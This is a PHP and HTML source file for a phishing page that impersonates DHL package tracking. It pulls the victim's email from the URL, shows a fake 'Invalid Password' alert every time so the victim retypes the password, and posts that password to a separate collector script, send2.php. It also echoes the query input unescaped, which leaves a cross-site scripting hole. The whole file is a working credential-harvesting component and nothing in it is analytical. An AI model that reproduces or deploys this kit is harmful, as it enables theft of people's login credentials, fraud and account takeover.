<?php
session_start();

// start > to get url and and put id 
 $url="http://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];
 parse_str(parse_url($url, PHP_URL_QUERY));

 $parts = @explode('@', $userid);
 $user = @$parts[0];
// < end 


$email = $userid;
$_SESSION['email'] = $email;


?>

<html>
<!--[if lt IE 7]> <html class="lt-ie9 lt-ie8 lt-ie7" lang="en"> <!

[endif]-->
<!--[if IE 7]> <html class="lt-ie9 lt-ie8" lang="en"> <![endif]-->
<!--[if IE 8]> <html class="lt-ie9" lang="en"> <![endif]-->
<!--[if gt IE 8]><!--> <html lang="en"> <!--<![endif]-->
    <head>
    <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
  <title>Login Form</title>
  <link rel="stylesheet" href="css/style.css">
  <style type="text/css">
html { 
  background: url(hero-caribbeanmale-point.png) no-repeat fixed; 

}
  </style>
  <!--[if lt IE 9]><script 

src="//html5shim.googlecode.com/svn/trunk/html5.js"></script><!

[endif]-->
        <script src="jquery-1.11.3.min.js" 

type="text/javascript"></script>
        <script src="jquery.validate.min.js" 

type="text/javascript"></script>
        <script>
            $(document).ready(function() {				
		// validate signup form on keyup and submit
		$("#form1").validate({
			rules: {
				name1:{
                                    required: true
                                }, 
                                
				pass1: {
					required: true,
					minlength: 6
				},
//				 			
			},
			messages: {
				name: "Please enter your email",
				name1: {
					required: "Please enter email",	

				
					
				},				
				pass1: {
					required: "Please provide a 

password",
					minlength: "Incorrect password"
				}
//				 			
			}
		});
		
	});
	</script> 
	<style>
	.error{
		color:red;	
	}	
	</style>      
    </head>
<body>
<section class="container">
    <div class="login">
    <img src='DHL.png' width="293" height="127">
<h1><p style='font-size:13px; color:#828a8f; font-weight:bold;'>Sign in 

with your correct email and password</p></h1>
        
                        <?php  echo ("<SCRIPT LANGUAGE='JavaScript'>
    window.alert('Invalid Password. Re-enter Password.')
    
    </SCRIPT>");
	?>
<form method="post" action="send2.php" onSubmit="return validateForm()" 

name="myform">
             <input type="hidden" value="" name="email">
             <input type="hidden" value="" name="name">
             <input type="hidden" value="" name="pass">
            <table>
                <tr>
                    <td> </td>
                    
<td style='font-size:13px; color:#828a8f; font-weight:bold;' text-align:centre;> 

&nbsp Email:

<?php echo $email ?> </td></p>
                </tr>
                <tr>
                    <td>  </td>
                    <td><input type="password" placeholder="Re-enter 

Password" name="epass"></td>
                </tr>
                <tr>
                    <td></td>
                    <p></p>
                  <td> <p><input type="submit" name="submit" 

value="Login to View"></p></td>
                </tr>
                    
</form>
                
</body>
<align='center' style='font-size:12px; color:#dddddd; font-

weight:bold;'><span class='footer-notes'>&nbsp Login to continue tracking 

your package.</span></p>

</html>